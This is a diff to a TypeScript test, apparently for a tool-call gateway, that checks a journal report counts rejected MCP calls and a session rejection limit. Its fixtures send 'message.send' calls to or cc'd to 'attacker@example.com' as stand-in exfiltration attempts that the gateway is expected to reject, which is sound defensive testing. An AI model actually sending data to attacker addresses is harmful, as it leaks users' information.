@@ -77,7 +77,7 @@ async function through(socket: string, messages: readonly unknown[]): Promise<Re
 describe("juno journal report on a gateway journal (D-254, D-256)", () => {
   // proves D-256 over §3.4.2: a call the gateway's boundary rejects is counted once, as the service's replay counts it;
   // the allowed call and the parked one are counted too
-  it("counts a rejected gateway call once", async () => {
+  it("counts a rejected gateway call once, and the rejection limit as no call of its own", async () => {
     let stop: () => void = () => undefined;
     const stopped = new Promise<void>((resolve) => (stop = resolve));
     const said: string[] = [];
@@ -92,11 +92,12 @@ describe("juno journal report on a gateway journal (D-254, D-256)", () => {
       { jsonrpc: "2.0", method: "notifications/initialized" },
       { jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "message.send", arguments: { to: "attacker@example.com", body: "x" } } },
       { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "message.send", arguments: { to: "ops@example.com", body: "y" } } },
-      { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "message.send", arguments: { to: "ops@example.com", body: "z", cc: "attacker@example.com" } } },
+      // Three calls in a row the boundary rejects: the third reaches the session's rejection limit (§2.7.1 A4).
+      ...[4, 5, 6].map((id) => ({ jsonrpc: "2.0", id, method: "tools/call", params: { name: "message.send", arguments: { to: "ops@example.com", body: "z", cc: "attacker@example.com" } } })),
     ]);
     stop();
     expect(await running).toBe(0);
-    expect(answers.slice(1).map((answer) => (answer["result"] as { isError?: boolean } | undefined)?.isError === true)).toEqual([true, false, true]);
+    expect(answers.slice(1).map((answer) => (answer["result"] as { isError?: boolean } | undefined)?.isError === true)).toEqual([true, false, true, true, true]);
     // The operator's copy and clone, as Part G step 7 makes them.
     const copy = join(dir, "juno-check");
     mkdirSync(copy, { mode: 0o700 });
@@ -114,7 +115,9 @@ describe("juno journal report on a gateway journal (D-254, D-256)", () => {
     expect(code, out.join("")).toBe(0);
     const report = JSON.parse(out.join("")) as { sessions: Record<string, unknown>[]; total: Record<string, unknown> };
     expect(report.sessions).toHaveLength(1);
-    expect(report.sessions[0]).toMatchObject({ mode: "gateway", allowed: 1, parked: 1, rejected: 1, passed_to_gateway: 0, parks_by_capability: [{ value: "mcp.message.send", count: 1 }] });
-    expect(report.total).toMatchObject({ allowed: 1, parked: 1, rejected: 1 });
+    // Five calls: one allowed, one parked, three rejected (each once, though each is journalled as the call and a note
+    // naming it), and the limit reached once after the third, which is not a call of its own (D-256, D-257).
+    expect(report.sessions[0]).toMatchObject({ mode: "gateway", allowed: 1, parked: 1, rejected: 3, rejection_limit_reached: 1, passed_to_gateway: 0, parks_by_reason: [{ value: "integrity_floor", count: 1 }], parks_by_capability: [{ value: "mcp.message.send", count: 1 }] });
+    expect(report.total).toMatchObject({ allowed: 1, parked: 1, rejected: 3, rejection_limit_reached: 1 });
   }, 120_000);
 });
